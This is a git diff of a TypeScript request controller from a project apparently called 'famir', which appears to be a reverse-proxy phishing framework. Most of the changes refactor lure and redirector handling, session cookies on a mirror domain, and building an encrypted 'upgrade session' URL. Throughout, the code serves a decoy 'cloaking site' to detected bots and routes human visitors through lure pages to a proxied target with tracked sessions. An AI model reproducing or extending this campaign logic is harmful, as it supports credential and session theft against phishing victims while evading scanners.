@@ -1,10 +1,10 @@
 import { decrypt, DIContainer, encrypt, randomName } from '@famir/common'
 import {
-  EnabledFullTargetModel,
-  EnabledLureModel,
   FullCampaignModel,
   FullRedirectorModel,
-  SessionModel
+  RedirectorParams,
+  SessionModel,
+  UpgradeSessionParams,
 } from '@famir/database'
 import { HTTP_SERVER_ROUTER, HttpServerContext, HttpServerRouter } from '@famir/http-server'
 import { HttpCookie } from '@famir/http-tools'
@@ -16,20 +16,20 @@ import {
   type AuthSessionUseCase,
   CREATE_SESSION_USE_CASE,
   type CreateSessionUseCase,
-  FIND_LURE_REDIRECTOR_USE_CASE,
-  type FindLureRedirectorUseCase,
+  FIND_LURE_USE_CASE,
+  type FindLureUseCase,
   READ_PROXY_USE_CASE,
+  READ_REDIRECTOR_USE_CASE,
   type ReadProxyUseCase,
+  type ReadRedirectorUseCase,
   UPGRADE_SESSION_USE_CASE,
-  type UpgradeSessionUseCase
+  type UpgradeSessionUseCase,
 } from '../../use-cases/index.js'
 import { BaseController } from '../base/index.js'
 import {
   AUTHORIZE_CONTROLLER,
   AuthorizeDispatchAccessLevel,
   AuthorizeDispatchContextType,
-  LandingLurePayload,
-  LandingUpgradePayload
 } from './authorize.js'
 import { authorizeSchemas } from './authorize.schemas.js'
 
@@ -50,7 +50,8 @@ export class AuthorizeController extends BaseController {
           c.resolve<Templater>(TEMPLATER),
           c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
           c.resolve<ReadProxyUseCase>(READ_PROXY_USE_CASE),
-          c.resolve<FindLureRedirectorUseCase>(FIND_LURE_REDIRECTOR_USE_CASE),
+          c.resolve<ReadRedirectorUseCase>(READ_REDIRECTOR_USE_CASE),
+          c.resolve<FindLureUseCase>(FIND_LURE_USE_CASE),
           c.resolve<CreateSessionUseCase>(CREATE_SESSION_USE_CASE),
           c.resolve<AuthSessionUseCase>(AUTH_SESSION_USE_CASE),
           c.resolve<UpgradeSessionUseCase>(UPGRADE_SESSION_USE_CASE)
@@ -68,15 +69,16 @@ export class AuthorizeController extends BaseController {
   constructor(
     validator: Validator,
     logger: Logger,
-    protected templater: Templater,
+    templater: Templater,
     router: HttpServerRouter,
     protected readonly readProxyUseCase: ReadProxyUseCase,
-    protected readonly findLureRedirectorUseCase: FindLureRedirectorUseCase,
+    protected readonly readRedirectorUseCase: ReadRedirectorUseCase,
+    protected readonly findLureUseCase: FindLureUseCase,
     protected readonly createSessionUseCase: CreateSessionUseCase,
     protected readonly authSessionUseCase: AuthSessionUseCase,
     protected readonly upgradeSessionUseCase: UpgradeSessionUseCase
   ) {
-    super(validator, logger, router)
+    super(validator, logger, templater, router)
 
     this.validator.addSchemas(authorizeSchemas)
 
@@ -95,17 +97,17 @@ export class AuthorizeController extends BaseController {
     })
   }
 
-  protected dispatchRoot: AuthorizeDispatchContextType = {
+  private dispatchRoot: AuthorizeDispatchContextType = {
     normal: async (ctx, campaign, target, next) => {
       await this.dispatchNormal[target.accessLevel](ctx, campaign, target, next)
     },
 
     websocket: async (ctx, campaign, target, next) => {
       await this.dispatchWebSocket[target.accessLevel](ctx, campaign, target, next)
-    }
+    },
   }
 
-  protected dispatchNormal: AuthorizeDispatchAccessLevel = {
+  private dispatchNormal: AuthorizeDispatchAccessLevel = {
     transparent: async (ctx, campaign, target, next) => {
       if (ctx.isBot) {
         await this.sendCloakingSite(ctx, target)
@@ -119,13 +121,13 @@ export class AuthorizeController extends BaseController {
       if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
         session = await this.authSessionUseCase.execute({
           campaignId: campaign.campaignId,
-          sessionId: sessionCookie
+          sessionId: sessionCookie,
         })
       }
 
       if (!session) {
         session = await this.createSessionUseCase.execute({
-          campaignId: campaign.campaignId
+          campaignId: campaign.campaignId,
         })
       }
 
@@ -133,7 +135,7 @@ export class AuthorizeController extends BaseController {
 
       const proxy = await this.readProxyUseCase.execute({
         campaignId: campaign.campaignId,
-        proxyId: session.proxyId
+        proxyId: session.proxyId,
       })
 
       this.setState(ctx, 'proxy', proxy)
@@ -142,7 +144,7 @@ export class AuthorizeController extends BaseController {
       if (ctx.state.verbose) {
         ctx.responseHeaders.merge({
           'X-Famir-Session-Id': session.sessionId,
-          'X-Famir-Proxy-Id': proxy.proxyId
+          'X-Famir-Proxy-Id': proxy.proxyId,
         })
       }
 
@@ -150,15 +152,15 @@ export class AuthorizeController extends BaseController {
     },
 
     landing: async (ctx, campaign, target, next) => {
-      if (ctx.url.isPath(campaign.landingUpgradePath)) {
+      if (ctx.url.isPath(campaign.upgradeSessionPath)) {
         if (!ctx.method.is('GET')) {
           await this.sendNotFoundPage(ctx, target)
 
           return
         }
 
-        const upgradePayload = this.parseLandingUpgradePayload(ctx, campaign)
-        if (!upgradePayload) {
+        const upgradeSessionParams = this.parseUpgradeSessionParams(ctx, campaign)
+        if (!upgradeSessionParams) {
           await this.sendNotFoundPage(ctx, target)
 
           return
@@ -170,45 +172,53 @@ export class AuthorizeController extends BaseController {
           return
         }
 
-        const ok = await this.upgradeSessionUseCase.execute({
+        const okey = await this.upgradeSessionUseCase.execute({
           campaignId: campaign.campaignId,
-          lureId: upgradePayload.lure_id,
-          sessionId: upgradePayload.session_id,
-          secret: upgradePayload.secret
+          lureId: upgradeSessionParams.lure_id,
+          sessionId: upgradeSessionParams.session_id,
+          secret: upgradeSessionParams.secret,
         })
 
-        if (!ok) {
+        if (!okey) {
           await this.sendNotFoundPage(ctx, target)
 
           return
         }
 
-        await this.sendRedirectTo(ctx, upgradePayload.back_url)
+        await this.sendRedirectTo(ctx, upgradeSessionParams.back_url)
 
         return
       }
 
-      const lureRedirector = await this.findLureRedirectorUseCase.execute({
+      const lure = await this.findLureUseCase.execute({
         campaignId: campaign.campaignId,
-        path: ctx.url.get('pathname')
+        path: ctx.url.get('pathname'),
       })
 
-      if (lureRedirector) {
+      if (lure) {
         if (!ctx.method.is(['GET', 'HEAD'])) {
           await this.sendNotFoundPage(ctx, target)
 
           return
         }
 
-        const lurePayload = this.parseLandingLurePayload(ctx, campaign)
-        if (!lurePayload) {
+        const redirector = await this.readRedirectorUseCase.execute({
+          campaignId: campaign.campaignId,
+          redirectorId: lure.redirectorId,
+        })
+
+        const redirectorParams = this.parseRedirectorParams(ctx, campaign, redirector)
+        if (!redirectorParams) {
           await this.sendNotFoundPage(ctx, target)
 
           return
         }
 
         if (ctx.isBot) {
-          await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, null, lurePayload)
+          await this.sendRedirectorPage(ctx, target, redirector, {
+            ...redirectorParams,
+            upgrade_url: null,
+          })
 
           return
         }
@@ -216,7 +226,7 @@ export class AuthorizeController extends BaseController {
         const sessionCookie = this.getSessionCookie(ctx, campaign)
         if (!sessionCookie) {
           const session = await this.createSessionUseCase.execute({
-            campaignId: campaign.campaignId
+            campaignId: campaign.campaignId,
           })
 
           this.persistSessionCookie(ctx, campaign, session)
@@ -236,7 +246,7 @@ export class AuthorizeController extends BaseController {
 
         const session = await this.authSessionUseCase.execute({
           campaignId: campaign.campaignId,
-          sessionId: sessionCookie
+          sessionId: sessionCookie,
         })
 
         if (!session) {
@@ -249,7 +259,25 @@ export class AuthorizeController extends BaseController {
 
         this.persistSessionCookie(ctx, campaign, session)
 
-        await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, session, lurePayload)
+        const upgradeSessionParams: UpgradeSessionParams = {
+          lure_id: lure.lureId,
+          session_id: session.sessionId,
+          secret: session.secret,
+          back_url: redirectorParams['back_url'] ?? '/',
+        }
+
+        const upgrade_url = [
+          campaign.upgradeSessionPath,
+          '?',
+          randomName(),
+          '=',
+          encrypt(JSON.stringify(upgradeSessionParams), campaign.cryptSecret),
+        ].join('')
+
+        await this.sendRedirectorPage(ctx, target, redirector, {
+          ...redirectorParams,
+          upgrade_url,
+        })
 
         return
       }
@@ -277,7 +305,7 @@ export class AuthorizeController extends BaseController {
 
       const session = await this.authSessionUseCase.execute({
         campaignId: campaign.campaignId,
-        sessionId: sessionCookie
+        sessionId: sessionCookie,
       })
 
       if (!session) {
@@ -298,7 +326,7 @@ export class AuthorizeController extends BaseController {
 
       const proxy = await this.readProxyUseCase.execute({
         campaignId: campaign.campaignId,
-        proxyId: session.proxyId
+        proxyId: session.proxyId,
       })
 
       this.setState(ctx, 'proxy', proxy)
@@ -307,15 +335,15 @@ export class AuthorizeController extends BaseController {
       if (ctx.state.verbose) {
         ctx.responseHeaders.merge({
           'X-Famir-Session-Id': session.sessionId,
-          'X-Famir-Proxy-Id': proxy.proxyId
+          'X-Famir-Proxy-Id': proxy.proxyId,
         })
       }
 
       await next()
-    }
+    },
   }
 
-  protected dispatchWebSocket: AuthorizeDispatchAccessLevel = {
+  private dispatchWebSocket: AuthorizeDispatchAccessLevel = {
     transparent: async (ctx, campaign, target, next) => {
       if (ctx.isBot) {
         ctx.close()
@@ -329,19 +357,19 @@ export class AuthorizeController extends BaseController {
       if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
         session = await this.authSessionUseCase.execute({
           campaignId: campaign.campaignId,
-          sessionId: sessionCookie
+          sessionId: sessionCookie,
         })
       }
 
       if (!session) {
         session = await this.createSessionUseCase.execute({
-          campaignId: campaign.campaignId
+          campaignId: campaign.campaignId,
         })
       }
 
       const proxy = await this.readProxyUseCase.execute({
         campaignId: campaign.campaignId,
-        proxyId: session.proxyId
+        proxyId: session.proxyId,
       })
 
       this.setState(ctx, 'proxy', proxy)
@@ -366,7 +394,7 @@ export class AuthorizeController extends BaseController {
 
       const session = await this.authSessionUseCase.execute({
         campaignId: campaign.campaignId,
-        sessionId: sessionCookie
+        sessionId: sessionCookie,
       })
 
       if (!session || !session.isUpgraded) {
@@ -377,17 +405,17 @@ export class AuthorizeController extends BaseController {
 
       const proxy = await this.readProxyUseCase.execute({
         campaignId: campaign.campaignId,
-        proxyId: session.proxyId
+        proxyId: session.proxyId,
       })
 
       this.setState(ctx, 'proxy', proxy)
       this.setState(ctx, 'session', session)
 
       await next()
-    }
+    },
   }
 
-  protected getSessionCookie(
+  private getSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
   ): HttpCookie | undefined {
@@ -396,11 +424,11 @@ export class AuthorizeController extends BaseController {
     return cookies ? cookies[campaign.sessionCookieName] : undefined
   }
 
-  protected checkSessionCookie(value: unknown): value is string {
-    return this.validator.guardSchema<string>('reverse-session-cookie', value)
+  private checkSessionCookie(value: unknown): value is string {
+    return this.validator.guardSchema<string>('reverse-authorize-session-cookie', value)
   }
 
-  protected persistSessionCookie(
+  private persistSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
     session: SessionModel
@@ -416,13 +444,13 @@ export class AuthorizeController extends BaseController {
       domain: '.' + campaign.mirrorDomain,
       path: '/',
       httpOnly: true,
-      maxAge: Math.round(campaign.sessionExpire / 1000)
+      maxAge: Math.round(campaign.sessionExpire / 1000),
     }
 
     ctx.responseHeaders.setSetCookies(setCookies)
   }
 
-  protected removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
+  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
     if (ctx.type !== 'normal') {
       throw new Error(`Only 'normal' context type allowed`)
     }
@@ -434,19 +462,19 @@ export class AuthorizeController extends BaseController {
       domain: '.' + campaign.mirrorDomain,
       path: '/',
       httpOnly: true,
-      maxAge: 0
+      maxAge: 0,
     }
 
     ctx.responseHeaders.setSetCookies(setCookies)
   }
 
-  protected parseLandingUpgradePayload(
+  private parseUpgradeSessionParams(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
-  ): LandingUpgradePayload | null {
+  ): UpgradeSessionParams | null {
     try {
-      const params = ctx.url.getQueryString()
-      const value = Object.values(params)[0]
+      const urlParams = ctx.url.getQueryString()
+      const value = Object.values(urlParams)[0]
 
       if (!(value && typeof value === 'string')) {
         return null
@@ -454,7 +482,10 @@ export class AuthorizeController extends BaseController {
 
       const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))
 
-      this.validator.assertSchema<LandingUpgradePayload>('reverse-landing-upgrade-payload', data)
+      this.validator.assertSchema<UpgradeSessionParams>(
+        'reverse-authorize-upgrade-session-params',
+        data
+      )
 
       return data
     } catch {
@@ -462,91 +493,26 @@ export class AuthorizeController extends BaseController {
     }
   }
 
-  protected parseLandingLurePayload(
-    ctx: HttpServerContext,
-    campaign: FullCampaignModel
-  ): LandingLurePayload | null {
-    try {
-      const params = ctx.url.getQueryString()
-      const value = Object.values(params)[0]
-
-      if (!(value && typeof value === 'string')) {
-        return {}
-      }
-
-      const payload: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))
-
-      this.validator.assertSchema<LandingLurePayload>('reverse-landing-lure-payload', payload)
-
-      return payload
-    } catch {
-      return null
-    }
-  }
-
-  protected async sendCloakingSite(
-    ctx: HttpServerContext,
-    target: EnabledFullTargetModel
-  ): Promise<void> {
-    if (ctx.url.isPath('/')) {
-      await this.sendMainPage(ctx, target)
-    } else {
-      await this.sendNotFoundPage(ctx, target)
-    }
-  }
-
-  protected async sendRedirectorPage(
+  private parseRedirectorParams(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
-    target: EnabledFullTargetModel,
-    lureRedirector: [EnabledLureModel, FullRedirectorModel],
-    session: SessionModel | null,
-    lurePayload: LandingLurePayload
-  ): Promise<void> {
-    if (ctx.type !== 'normal') {
-      throw new Error(`Only 'normal' context type allowed`)
-    }
+    redirector: FullRedirectorModel
+  ): RedirectorParams | null {
+    try {
+      const urlParams = ctx.url.getQueryString()
+      const value = Object.values(urlParams)[0]
 
-    if (ctx.method.is(['GET', 'HEAD'])) {
-      const [lure, redirector] = lureRedirector
-
-      ctx.status.set(200)
-
-      if (session) {
-        const upgradePayload: LandingUpgradePayload = {
-          lure_id: lure.lureId,
-          session_id: session.sessionId,
-          secret: session.secret,
-          back_url: lurePayload['back_url'] ?? '/'
-        }
-
-        lurePayload['upgrade_url'] = [
-          campaign.landingUpgradePath,
-          '?',
-          randomName(),
-          '=',
-          encrypt(JSON.stringify(upgradePayload), campaign.cryptSecret)
-        ].join('')
+      if (!(value && typeof value === 'string')) {
+        return redirector.isLoose ? {} : null
       }
 
-      const redirectorPage = this.templater.render(redirector.page, lurePayload)
+      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))
 
-      ctx.responseBody.setText(redirectorPage)
+      this.validator.assertSchema<RedirectorParams>('reverse-authorize-redirector-params', data)
 
-      ctx.responseHeaders.merge({
-        'Content-Type': 'text/html',
-        'Content-Length': ctx.responseBody.length.toString(),
-        'Last-Modified': redirector.createdAt.toUTCString(),
-        'Cache-Control': 'public, max-age=86400'
-      })
-
-      if (ctx.method.is('HEAD')) {
-        ctx.responseBody.reset()
-      }
-
-      await ctx.sendResponse()
-    } else {
-      await this.sendNotFoundPage(ctx, target)
+      return redirector.checkParams(data) ? data : null
+    } catch {
+      return null
     }
   }
 }
